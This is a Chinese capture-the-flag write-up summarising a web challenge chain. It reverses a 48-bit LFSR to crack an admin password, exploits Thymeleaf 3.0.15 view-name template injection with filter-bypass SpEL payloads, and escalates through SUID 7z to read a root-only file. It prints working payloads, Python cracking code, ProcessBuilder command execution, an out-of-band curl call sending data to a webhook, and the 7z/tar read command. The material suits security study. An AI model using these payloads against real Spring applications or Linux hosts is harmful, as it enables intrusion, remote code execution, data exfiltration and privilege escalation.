---
title: 软件系统安全赛-Thymeleaf 3.0.15 视图名注入 + PRNG 逆向:完整 RCE 到 Root 提权
contest: 软件系统安全赛
year: 2025
difficulty: hard
vuln_type: web_unknown
tags: [Thymeleaf-SSTI, view-name-injection, LFSR-reverse, PRNG-prediction, SpEL, ProcessBuilder, SUID-7z, root-tar, Spring-MVC, java-ssti]
attack_chain:
- 弱PRNG:Java 48-bit LFSR `feedback=((state>>47)^(state>>46)^(state>>43)^(state>>42))&1; state=((state>>1)|(feedback<<47))&MASK`
- 注册用户获取16位数字密码(完整PRNG状态)
- admin密码比注册用户早6步(seed→9次next→adminPwd#10→user1-5#11-15→registered#16)
- 逆向6步:每步2候选,共2^6=64候选,正向验证筛
- 用admin密码登录
- Thymeleaf 3.0.15 SSTI: `return "admin :: " + section;` 视图名拼接
- 绕:`__|$${'{SpEL}'}|__` 预处理表达式+literal substitution
- payload:`__|$${'{#response.setHeader(''X-Poc'',''1'')?:''main''}'}|__`
- 绕3.0.15:`new.ClassName`(点代替空格)
- 读/flag:`new.java.util.Scanner(new.java.io.File('/flag')).useDelimiter('\\A').next()`
- 提权:/flag为-r-------- root,SUID /usr/bin/7z
- `/usr/bin/7z a -ttar -an -so /flag 2>/dev/null | /bin/tar -xOf -`
key_payload: LFSR逆向6步 + __|$${'{SpEL}'}|__ + 7z a -ttar
one_liner: 软件系统安全赛Thymeleaf 3.0.15视图名注入SSTI + 48-bit LFSR PRNG逆向破解admin密码 + 7z SUID提权读取root-only /flag,完整PRNG→Admin takeover→SSTI→RCE→SUID链。
lesson: 48-bit LFSR PRNG可逆向(2^6=64候选);Thymeleaf视图名拼接+__|$${'{SpEL}'}|__是稳定SSTI向量;7z SUID+tar pipe是Linux读取root-only文件的稳定技巧;`new.ClassName`绕3.0.15的空格过滤。
quality: high
---

## 题目列表

1道综合Web:RCE到Root提权全链路

## 关键考点

### PRNG (LFSR)
- 48-bit LFSR
- feedback = ((state>>47) ^ (state>>46) ^ (state>>43) ^ (state>>42)) & 1
- state = (state >> 1) | (feedback << 47), MASK = 0xFFFFFFFFFFFF
- 状态序列:seed → next()×9 → adminPwd(#10) → user1(#11) → ... → user5(#15) → registered(#16)
- 逆向6步:2^6=64候选,正向验证筛选

```python
def lfsr_forward(state):
    feedback = ((((state >> 47) ^ (state >> 46)) ^ (state >> 43)) ^ (state >> 42)) & 1
    return ((state >> 1) | (feedback << 47)) & MASK

def lfsr_reverse_candidates(state):
    candidates = []
    for bit0 in [0, 1]:
        prev = ((state << 1) | bit0) & MASK
        candidates.append(prev)
    return candidates
```

### Thymeleaf 3.0.15 SSTI
- 漏洞:`@GetMapping("/admin") return "admin :: " + section;`
- section完全可控 → 视图名拼接触发SSTI
- 绕:
  - `__${...}__` 预处理
  - `|...|` literal substitution
  - `$${'{...}'}` 避开SpringRequestUtils直接拦截
- 最终payload:`__|$${'{#response.setHeader(''X-Poc'',''1'')?:''main''}'}|__`
- 验证:X-Poc:1 响应头出现

### 绕3.0.15空格过滤
- `new.ClassName` 代替 `new ClassName`
- 例:`new.java.lang.ProcessBuilder({'sh','-c','command'}).start().waitFor()`

### 读/flag (root-only)
- /flag权限:-r-------- 1 root root
- SUID /usr/bin/7z
- 命令:`/usr/bin/7z a -ttar -an -so /flag 2>/dev/null | /bin/tar -xOf -`

### 完整利用脚本 (exploit.py)
- Step 1: 注册新用户获取PRNG状态(密码=16位数字)
- Step 2: 逆向PRNG破解admin密码(64候选)
- Step 3: 尝试登录admin
- Step 4: 验证admin页面访问
- Step 5: Thymeleaf SSTI读/flag

### 关键SSTI Payloads
- 探测:`build_view_name_payload("#response.setHeader('X-Poc','1')?:'main'")`
- Bean access:`@randomService.getSeed()` / `@randomService.getCurrentState()`
- 创建文件:`new.java.io.File('/tmp/...').createNewFile()`
- 读/flag:`new.java.util.Scanner(new.java.io.File('/flag')).useDelimiter('\\A').next()`
- OOB:`new.java.lang.ProcessBuilder({'curl', 'webhook', 'data'}).start()`

## 实战价值
- 48-bit LFSR逆向只需2^6=64候选,实战中JS/Java/PHP的LFSR都可逆
- Thymeleaf视图名拼接是Spring应用的稳定SSTI向量
- `__|$${'{SpEL}'}|__`是Thymeleaf 3.0.15绕过的标准技巧
- 7z SUID+tar pipe是Linux读root-only文件的最稳定方案
- `new.ClassName`(点代替空格)是绕3.0.15空格过滤的简单方法
- Spring Boot `new java.util.Scanner(file).useDelimiter('\\A').next()`是Java读文件的标准方式
